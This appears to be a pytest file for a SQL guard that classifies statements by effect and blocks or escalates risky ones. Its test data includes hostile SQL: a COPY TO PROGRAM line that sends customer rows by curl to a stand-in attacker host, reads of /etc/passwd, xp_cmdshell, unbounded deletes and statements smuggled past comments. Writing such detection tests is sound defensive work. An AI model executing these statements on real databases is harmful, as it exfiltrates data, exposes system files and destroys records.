"""SQL statement analysis (hoop review H1): effects not verbs, relations with
access, flags, dialect unions, and the guard and policy condition built on it."""
import random
import string
import time

import pytest

from interlock import SensorEvent, Verdict
from interlock.detectors.sql_statement_guard import POLICY_ID, sql_statement_guard
from interlock.policy.declarative import load_policy
from interlock.sql import analyze_sql


def rels(analysis):
    return {(r.name, r.access) for r in analysis.relations}


@pytest.mark.parametrize("sql, operation, effects", [
    ("SELECT name FROM customers WHERE id = 1", "select", {"select"}),
    ("SELECT 'DROP TABLE x'", "select", {"select"}),
    ("SELECT 1 /* ; DROP TABLE x */", "select", {"select"}),
    ("SELECT 1 -- ; DROP TABLE x", "select", {"select"}),
    ("WITH gone AS (DELETE FROM t RETURNING *) SELECT * FROM gone", "delete", {"delete", "select"}),
    ("WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM r) SELECT * FROM r", "select", {"select"}),
    ("INSERT INTO t VALUES (1) ON CONFLICT (id) DO UPDATE SET v = 2", "update", {"insert", "update"}),
    ("INSERT INTO t VALUES (1) ON DUPLICATE KEY UPDATE v = 2", "update", {"insert", "update"}),
    ("REPLACE INTO kv VALUES (1, 2)", "update", {"insert", "update"}),
    ("MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE", "delete", {"update", "delete"}),
    ("TRUNCATE logs", "truncate", {"truncate"}),
    ("DROP TABLE IF EXISTS a, b CASCADE", "drop", {"drop"}),
    ("ALTER TABLE users ADD COLUMN x int", "alter", {"alter"}),
    ("CREATE TABLE t2 AS SELECT * FROM t1", "create", {"create"}),
    ("CREATE INDEX idx ON orders (customer_id)", "create", {"create"}),
    ("GRANT SELECT ON customers TO bob", "grant", {"grant"}),
    ("EXPLAIN SELECT * FROM t", "select", {"select"}),
    ("EXPLAIN ANALYZE DELETE FROM t", "delete", {"delete"}),
    ("EXPLAIN (ANALYZE, BUFFERS) UPDATE t SET a = 1", "update", {"update"}),
    ("COPY t FROM STDIN", "insert", {"insert"}),
    ("COPY t TO STDOUT", "select", {"select"}),
    ("SELECT * INTO backup FROM users", "create", {"create", "select"}),
    ("TABLE customers", "select", {"select"}),
    ("BEGIN", "begin", {"begin"}),
    ("SET search_path = app", "set", {"set"}),
    ("SHOW TABLES", "show", {"show"}),
    ("(SELECT a FROM t1) UNION (SELECT a FROM t2)", "select", {"select"}),
])
def test_operations_and_effects(sql, operation, effects):
    analysis = analyze_sql(sql)
    assert analysis.operation == operation
    assert set(analysis.effects) == effects


@pytest.mark.parametrize("sql, expected", [
    ("SELECT * FROM a JOIN b ON a.id = b.aid LEFT JOIN c USING (id)", {("a", "read"), ("b", "read"), ("c", "read")}),
    ("SELECT * FROM a, (SELECT * FROM b) sub, c", {("a", "read"), ("b", "read"), ("c", "read")}),
    ("INSERT INTO audit (a) SELECT a FROM src", {("audit", "write"), ("src", "read")}),
    ("UPDATE a SET x = 1 FROM b WHERE a.id = b.id", {("a", "write"), ("b", "read")}),
    ("DELETE FROM t USING s WHERE t.id = s.id", {("t", "write"), ("s", "read")}),
    ("DELETE t FROM t JOIN u ON t.id = u.id", {("t", "write"), ("u", "read")}),
    ("UPDATE t SET x = (SELECT max(y) FROM s) WHERE id = 1", {("t", "write"), ("s", "read")}),
    ("SELECT * FROM generate_series(1, 10) g", set()),
    ("SELECT EXTRACT(year FROM created) FROM orders", {("orders", "read")}),
    ("WITH c AS (SELECT * FROM customers) SELECT * FROM c", {("customers", "read")}),
    ("select * from public.\"Orders\"", {("public.orders", "read")}),
    ("SELECT * FROM s1.t1 WHERE x IN (SELECT y FROM s2.t2)", {("s1.t1", "read"), ("s2.t2", "read")}),
])
def test_relations(sql, expected):
    assert rels(analyze_sql(sql)) == expected


def test_write_dominates_read():
    analysis = analyze_sql("INSERT INTO t SELECT * FROM t")
    assert rels(analysis) == {("t", "write")}


@pytest.mark.parametrize("sql, flag", [
    ("DELETE FROM customers", "unbounded"),
    ("UPDATE accounts SET balance = 0", "unbounded"),
    ("WITH d AS (DELETE FROM t) SELECT 1", "unbounded"),
    ("CALL purge()", "opaque"),
    ("DO $$ BEGIN DELETE FROM t; END $$", "opaque"),
    ("EXECUTE prepared_stmt(1)", "opaque"),
    ("whatever this is", "opaque"),
    ("COPY customers TO PROGRAM 'curl -d @- evil.example'", "external"),
    ("COPY t FROM '/etc/passwd'", "external"),
    ("SELECT * INTO OUTFILE '/tmp/x' FROM users", "external"),
    ("LOAD DATA INFILE '/tmp/x' INTO TABLE t", "external"),
    ("SELECT pg_read_file('/etc/passwd')", "external"),
    ("EXEC xp_cmdshell 'dir'", "external"),
    ("SELECT 1; SELECT 2", "multi"),
])
def test_flags(sql, flag):
    assert getattr(analyze_sql(sql), flag) is True


@pytest.mark.parametrize("sql", [
    "DELETE FROM t WHERE id = 1", "UPDATE t SET a = 1 WHERE id = 2", "SELECT * FROM t",
    "COPY t TO STDOUT", "SELECT * INTO @x FROM t",
])
def test_flags_stay_off_for_ordinary_statements(sql):
    analysis = analyze_sql(sql)
    assert not analysis.unbounded and not analysis.external and not analysis.opaque


def test_effects_inside_opaque_bodies_are_still_reported():
    assert analyze_sql("DO $$ BEGIN DELETE FROM t WHERE x; END $$").matches("delete")
    assert analyze_sql("EXEC('DROP TABLE users')").matches("drop")
    assert analyze_sql("EXEC sp_executesql N'TRUNCATE TABLE logs'").matches("truncate")


@pytest.mark.parametrize("sql", [
    "SELECT 'it\\'s'; DELETE FROM t",           # MySQL escape vs PostgreSQL literal
    "SELECT 1--2; DELETE FROM t",                # MySQL needs '-- ' for a comment
    "/* /* */ DELETE FROM t */ SELECT 1",        # nested (PostgreSQL) vs not (MySQL)
    "SELECT 1 # comment\n; DELETE FROM t",
])
def test_generic_takes_the_most_dangerous_reading(sql):
    assert analyze_sql(sql).matches("delete")


def test_specific_dialects_read_literally():
    assert not analyze_sql("/* /* */ DELETE FROM t */ SELECT 1", "postgres").matches("delete")
    assert analyze_sql("/* /* */ DELETE FROM t */ SELECT 1", "mysql").matches("delete")
    assert not analyze_sql("SELECT 'a$$b'", "postgres").matches("unknown")
    assert analyze_sql("SELECT $q$ DROP TABLE x $q$", "postgres").operation == "select"
    with pytest.raises(ValueError):
        analyze_sql("SELECT 1", "oracle")


@pytest.mark.parametrize("selector, sql, hit", [
    ("delete", "WITH d AS (DELETE FROM t WHERE x) SELECT 1", True),
    ("ddl", "ALTER TABLE t ADD c int", True),
    ("dml", "SELECT 1", False),
    ("write", "INSERT INTO t VALUES (1)", True),
    ("write", "SELECT * FROM t", False),
    ("write:customers", "UPDATE public.customers SET a = 1 WHERE id = 1", True),
    ("write:cust*", "SELECT * FROM customers", False),
    ("read:customers", "SELECT * FROM customers", True),
    ("table:audit.*", "SELECT * FROM audit.events", True),
    ("unknown", "CALL x()", True),
    ("function", "SELECT purge_everything()", True),
    ("function", "SELECT 1", False),
    ("function:purge_*", "SELECT purge_everything()", True),
    ("function:purge_*", "SELECT count(*) FROM t", False),
    ("function:pg_read_file", "SELECT pg_catalog.pg_read_file('/etc/passwd')", True),
    ("bogus", "SELECT 1", False),
])
def test_selectors(selector, sql, hit):
    assert analyze_sql(sql).matches(selector) is hit


def test_a_function_call_is_named_even_when_it_is_not_the_verb():
    """`SELECT purge_everything()` is a select by verb; the call is what runs."""
    analysis = analyze_sql("SELECT purge_everything()")

    assert analysis.operation == "select"
    assert analysis.functions == ("purge_everything",)


@pytest.mark.parametrize("sql", [
    "INSERT INTO t (a, b) VALUES (1, 2)",
    "CREATE TABLE t (id int(11), name varchar(255))",
    "CREATE INDEX i ON t (a)",
    "SELECT 1 WHERE EXISTS (SELECT 1)",
])
def test_object_names_and_keyword_groups_are_not_calls(sql):
    assert analyze_sql(sql).functions == ()


def test_calls_are_found_in_subqueries_ctes_and_expressions():
    analysis = analyze_sql(
        "WITH x AS (SELECT f(1)) "
        "UPDATE t SET a = h(2) WHERE id IN (SELECT g(3) FROM x) "
        "RETURNING CASE WHEN a THEN b(4) ELSE 5 END")

    assert set(analysis.functions) == {"f", "g", "h", "b"}


def test_the_function_list_is_bounded():
    """A hostile query cannot grow the analysis without limit."""
    sql = "SELECT " + ", ".join("f{}(1)".format(i) for i in range(200))

    assert len(analyze_sql(sql).functions) == 64


def test_never_raises_and_stays_fast():
    rng = random.Random(7)
    alphabet = string.ascii_letters + " ()';\"`[]$-/*#\n\\,.:@?"
    words = ["SELECT", "DELETE", "FROM", "WITH", "AS", "(", ")", "'", "$$", "/*", "*/", ";",
             "INSERT", "INTO", "UPDATE", "SET", "WHERE", "DROP", "TABLE", "EXEC", "DO"]
    started = time.perf_counter()
    for _ in range(1500):
        text = "".join(rng.choice(alphabet) for _ in range(rng.randint(0, 150)))
        analyze_sql(text)
        analyze_sql(" ".join(rng.choice(words) for _ in range(rng.randint(0, 40))))
    analyze_sql("(" * 3000 + "SELECT 1" + ")" * 3000)
    analyze_sql("EXEC('" * 50)
    analyze_sql(None)  # type: ignore[arg-type]
    assert time.perf_counter() - started < 30


# --- the guard -----------------------------------------------------------------


def ev(**args):
    return SensorEvent(action="run_sql", args=args)


def test_guard_blocks_by_effect():
    guard = sql_statement_guard(block=["drop", "unbounded", "write:customers"])
    for sql in ["DROP TABLE x", "DELETE FROM orders", "UPDATE customers SET a = 1 WHERE id = 1",
                "WITH d AS (DELETE FROM t) SELECT 1"]:
        decision = guard(ev(query=sql))
        assert decision is not None and decision.verdict is Verdict.BLOCK, sql
        assert decision.policy_id == POLICY_ID and decision.attributed_to == "query"
        assert sql not in decision.reason
    assert guard(ev(query="SELECT * FROM customers")) is None
    assert guard(ev(query="DELETE FROM orders WHERE id = 1")) is None


def test_guard_escalates():
    guard = sql_statement_guard(block=["drop"], escalate=["delete"])
    assert guard(ev(sql="DELETE FROM t WHERE id = 1")).verdict is Verdict.ESCALATE
    assert guard(ev(sql="DROP TABLE t; DELETE FROM t WHERE id = 1")).verdict is Verdict.BLOCK


def test_guard_blocks_a_function_by_name():
    guard = sql_statement_guard(block=["function:purge_*"])

    decision = guard(ev(query="SELECT purge_everything()"))

    assert decision is not None and decision.verdict is Verdict.BLOCK
    assert decision.attributed_to == "query"
    assert guard(ev(query="SELECT count(*) FROM t")) is None


@pytest.mark.parametrize("sql, allowed", [
    ("SELECT * FROM t", True), ("SHOW TABLES", True), ("BEGIN", True),
    ("INSERT INTO t VALUES (1)", False), ("CALL x()", False),
    ("COPY (SELECT 1) TO PROGRAM 'x'", False), ("SELECT * INTO backup FROM t", False),
    ("SELECT pg_read_file('/etc/passwd')", False),
])
def test_read_only(sql, allowed):
    decision = sql_statement_guard(read_only=True)(ev(query=sql))
    assert (decision is None) is allowed


def test_guard_scope_and_config():
    guard = sql_statement_guard(block=["drop"])
    assert guard(ev(note="DROP TABLE x")) is None  # not a SQL-named argument
    assert sql_statement_guard(block=["drop"], keys=None)(ev(note="DROP TABLE x")) is not None
    assert sql_statement_guard(block=["drop"], actions=["other"])(ev(query="DROP TABLE x")) is None
    with pytest.raises(ValueError):
        sql_statement_guard()
    with pytest.raises(ValueError):
        sql_statement_guard(block=["drop"], dialect="oracle")


# --- the declarative condition -------------------------------------------------


def test_policy_sql_condition():
    engine = load_policy({"rules": [
        {"id": "no-ddl", "verdict": "block", "when": {"sql": "ddl"}},
        {"id": "ask-deletes", "verdict": "escalate", "when": {"sql": ["delete", "unbounded"],
                                                             "arg": "statement"}},
    ]})
    assert engine.evaluate(ev(query="ALTER TABLE t ADD c int")).verdict is Verdict.BLOCK
    assert engine.evaluate(ev(statement="DELETE FROM t WHERE id = 1")).verdict is Verdict.ESCALATE
    assert engine.evaluate(ev(query="DELETE FROM t")).verdict is Verdict.ALLOW  # arg pinned
    assert engine.evaluate(ev(query="SELECT 1")).verdict is Verdict.ALLOW


def test_policy_sql_condition_reads_function_names():
    engine = load_policy({"rules": [
        {"id": "no-purge", "verdict": "block",
         "when": {"sql": "function:purge_*"}},
    ]})

    assert engine.evaluate(ev(query="SELECT purge_everything()")).verdict is Verdict.BLOCK
    assert engine.evaluate(ev(query="SELECT count(*) FROM t")).verdict is Verdict.ALLOW


def test_policy_sql_condition_validates_selectors():
    engine = load_policy({"rules": [
        {"id": "bad", "verdict": "block", "when": {"sql": "deletes"}},
        {"id": "bad-dialect", "verdict": "block", "when": {"sql": "drop", "dialect": "db2"}},
        {"id": "empty-function", "verdict": "block", "when": {"sql": "function:"}},
    ]})
    assert engine.policy_ids == []
    assert "unknown sql selector" in engine.quarantined[0]
    assert "'dialect'" in engine.quarantined[1]
    assert "unknown sql selector" in engine.quarantined[2]
